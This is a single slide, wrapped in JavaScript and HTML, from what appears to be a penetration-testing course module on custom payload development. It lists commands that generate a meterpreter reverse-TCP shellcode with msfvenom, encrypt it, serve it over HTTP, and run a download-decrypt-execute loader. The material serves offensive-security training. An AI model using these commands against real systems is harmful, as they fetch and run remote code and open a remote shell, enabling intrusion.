(function(){var loadHandler=window['sl_{9B7E1ACD-FE32-41D7-8304-031CE5D38424}'];loadHandler&&loadHandler(164, '<div id="spr0_9b961"><div id="spr1_9b961" class="kern slide"><img id="img4_9b961" src="data/img3.png" width="960px" height="540px" alt="" style="left:0px;top:0px;"/><a id="hl0_9b961" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg3_9b961" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr3_9b961" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl1_9b961" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt0_9b961" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl2_9b961" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg4_9b961" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr4_9b961" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl3_9b961" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt1_9b961" style="left:9.6px;top:2.776px;">d</span></a></div></div><div id="spr5_9b961" style="left:464px;top:504.919px;"><div style="width:0px;"><span id="txt2_9b961" class="nokern" data-width="300.722656" style="left:73.433px;top:4.798px;">PTXv2: Section 4, Module 1 - Caendra Inc. © 2020</span></div></div><div id="svg5_9b961" style="left:31.3px;top:501.094px;"><svg width="875" height="6" viewBox="-2.667 -1.333 875 6"><g fill="#c00000" stroke="none"><path stroke="#c00000" stroke-width="2.667" stroke-linecap="butt" transform="translate(-33.966309,-502.427063)" d="M33.966,503.76 H903.354"/></g></svg></div><a id="hl4_9b961" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;" style="left:905.506px;top:222px;"><div id="svg8_9b961" style="left:0px;top:0px;"><svg width="55" height="40" viewBox="0 0 55 40"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v40 h-54.494 Z"/></svg></div></a><div id="spr6_9b961" style="left:905.506px;top:222px;"><div style="width:0px;"><a id="hl5_9b961" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(1, this);return false;"><span id="txt3_9b961" style="left:9.6px;top:1.764px;">d</span></a></div></div><a id="hl6_9b961" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;" style="left:905.506px;top:272.055px;"><div id="svg9_9b961" style="left:0px;top:0px;"><svg width="55" height="30" viewBox="0 0 55 30"><path fill="#bbe0e3" fill-opacity="0" d="M0,0 h54.494 v29.081 h-54.494 Z"/></svg></div></a><div id="spr7_9b961" style="left:905.506px;top:272.055px;"><div style="width:0px;"><a id="hl7_9b961" href="#" onclick="document.getElementById(\'coreSpr_588484\').getCore().processTriggerEffect(this);document.getElementById(\'coreSpr_588484\').getCore().gotoSlide(326, this);return false;"><span id="txt4_9b961" style="left:9.6px;top:2.776px;">d</span></a></div></div></div><div id="spr2_9b961" class="kern slide"><div id="spr8_9b961" style="left:34.91px;top:262.44px;"><div style="width:0px;"><span id="txt5_9b961" data-width="774.983032" style="left:9.6px;top:0.385px;">The functionality can be tested by creating a meterpreter reverse tcp payload,</span></div><div style="width:0px;"><span id="txt6_9b961" data-width="840.880188" style="left:9.6px;top:22.145px;">encrypting it as we have done previously with 2_aes_encryption.exe and passing the</span></div><div style="width:0px;"><span id="txt7_9b961" data-width="559.428345" style="left:9.6px;top:44.084px;">encrypted shellcode URL as a first argument to our tool.</span></div></div><div id="spr9_9b961" style="left:63.75px;top:339px;"><div style="width:0px;"><span id="txt8_9b961" class="nokern" data-width="115.218750" style="left:20.444px;top:24.78px;"># Create shellcode</span></div><div style="width:0px;"><span id="txt9_9b961" class="nokern" data-width="800.130249" style="left:20.444px;top:39.971px;">~ msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=&lt;HOST&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread –smallest –f raw –o shellcode.bin</span></div><div style="width:0px;"><span id="txt10_9b961" class="nokern" data-width="121.619797" style="left:20.444px;top:55.331px;"># Encrypt shellcode</span></div><div style="width:0px;"><span id="txt11_9b961" class="nokern" data-width="262.442719" style="left:20.444px;top:70.691px;">~ mono 2_aes_encryption.exe shellcode.bin</span></div><div style="width:0px;"><span id="txt12_9b961" class="nokern" data-width="128.020844" style="left:20.444px;top:86.051px;"># Testing web server</span></div><div style="width:0px;"><span id="txt13_9b961" class="nokern" data-width="185.630219" style="left:20.444px;top:101.411px;">~ python3 –m http.server 8080</span></div><div style="width:0px;"><span id="txt14_9b961" class="nokern" data-width="57.609375" style="left:20.444px;top:116.771px;"># Execute</span></div><div style="width:0px;"><span id="txt15_9b961" class="nokern" data-width="294.447937" style="left:20.444px;top:132.131px;">4_download_decrypt_execute.exe &lt;SHELLCODE_URL&gt;</span></div></div><div id="spr10_9b961" style="left:63.75px;top:339px;"><img id="img0_9b961" src="data/img105.png" width="840" height="169.5" alt=""/></div><div id="spr11_9b961" style="left:63.75px;top:339px;"><div style="width:0px;"><span id="txt16_9b961" class="nokern" data-width="115.218750" style="left:17.616px;top:21.952px;"># Create shellcode</span></div><div style="width:0px;"><span id="txt17_9b961" class="nokern" data-width="800.130249" style="left:17.616px;top:37.142px;">~ msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=&lt;HOST&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread –smallest –f raw –o shellcode.bin</span></div><div style="width:0px;"><span id="txt18_9b961" class="nokern" data-width="121.619797" style="left:17.616px;top:52.502px;"># Encrypt shellcode</span></div><div style="width:0px;"><span id="txt19_9b961" class="nokern" data-width="262.442719" style="left:17.616px;top:67.862px;">~ mono 2_aes_encryption.exe shellcode.bin</span></div><div style="width:0px;"><span id="txt20_9b961" class="nokern" data-width="128.020844" style="left:17.616px;top:83.222px;"># Testing web server</span></div><div style="width:0px;"><span id="txt21_9b961" class="nokern" data-width="185.630219" style="left:17.616px;top:98.582px;">~ python3 –m http.server 8080</span></div><div style="width:0px;"><span id="txt22_9b961" class="nokern" data-width="57.609375" style="left:17.616px;top:113.942px;"># Execute</span></div><div style="width:0px;"><span id="txt23_9b961" class="nokern" data-width="294.447937" style="left:17.616px;top:129.302px;">4_download_decrypt_execute.exe &lt;SHELLCODE_URL&gt;</span></div></div><img id="img1_9b961" src="data/img19.png" width="23.25" height="20.25" alt="" style="left:60.11px;top:336.548px;"/><div id="spr12_9b961" style="left:832.34px;top:504.755px;"><div style="width:0px;"><span id="txt24_9b961" class="nokern" data-width="44.342445" style="left:9.6px;top:4.798px;">|  p.165</span></div></div><div id="spr13_9b961" style="left:34.91px;top:6px;"><div style="width:0px;"><span id="txt25_9b961" data-width="611.057983" style="left:9.6px;top:27.438px;">1.11 Custom Payload Development</span></div></div><div id="spr14_9b961" style="left:24px;top:114.75px;"><img id="img2_9b961" src="data/img106.png" width="428.25" height="144" alt=""/></div><div id="spr15_9b961" style="left:438.75px;top:117px;"><img id="img3_9b961" src="data/img107.png" width="465.75" height="99" alt=""/></div></div></div>');})();